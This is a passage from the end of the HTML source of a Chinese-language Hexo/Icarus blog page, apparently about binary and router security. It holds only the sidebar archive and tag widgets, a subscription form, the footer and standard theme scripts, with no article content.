href="/categories/BIN/">BIN</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Bin/"><span class="tag">Bin</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/NETGEAR/"><span class="tag">NETGEAR</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/QEMU/"><span class="tag">QEMU</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Router/"><span class="tag">Router</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Security/"><span class="tag">Security</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iOS/"><span class="tag">iOS</span><span class="tag">2</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4" alt="avcatshy" height="28"></a><p class="is-size-7"><span>&copy; 2021 vlinkstone</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><!--!--></body></html>